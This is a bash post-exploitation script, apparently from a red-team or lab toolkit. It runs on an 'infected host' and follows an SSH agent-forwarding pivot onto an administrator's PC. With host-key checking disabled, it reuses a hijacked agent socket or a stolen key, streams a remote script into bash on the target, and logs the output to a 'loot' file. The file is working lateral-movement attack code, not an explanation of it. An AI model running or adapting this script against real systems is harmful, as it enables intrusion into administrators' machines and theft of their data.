#!/usr/bin/env bash
# Infected host: after agent/RemoteForward pivot — SSH to admin PC and run remote script.
# Usage:
#   sudo ./post_pivot_admin_host.sh <ADMIN_IP> [ssh_port]
#   KEY=/path/to/key sudo ./post_pivot_admin_host.sh 172.17.0.2
#   # after agent pivot only (as legacy):
#   sudo -u legacy SSH_AUTH_SOCK=... ./post_pivot_admin_host.sh <IP> 22
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ADMIN_IP="${1:-}"
ADMIN_PORT="${2:-22}"
ADMIN_USER="${ADMIN_USER:-admin}"
KEY="${KEY:-}"
LOOT_DIR="${LOOT_DIR:-/tmp}"
OUT="${LOOT_DIR}/admin-host-$(date +%Y%m%d-%H%M%S).log"

[[ -n "$ADMIN_IP" ]] || {
  echo "Usage: $0 <ADMIN_IP> [ssh_port]"
  echo "  Or set ADMIN_IP from: ss -tnH state established '( sport = :22 )' ..."
  exit 1
}

SSH_BASE=( -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
           -p "$ADMIN_PORT" "${ADMIN_USER}@${ADMIN_IP}" )

if [[ -n "$KEY" && -r "$KEY" ]]; then
  SSH_BASE=( -i "$KEY" "${SSH_BASE[@]}" )
fi

echo "[*] Running remote_on_admin_host.sh on ${ADMIN_USER}@${ADMIN_IP}:${ADMIN_PORT}"
echo "[*] Loot -> ${OUT}"
ssh "${SSH_BASE[@]}" 'bash -s' < "$DIR/remote_on_admin_host.sh" | tee "$OUT"
echo "[+] Done."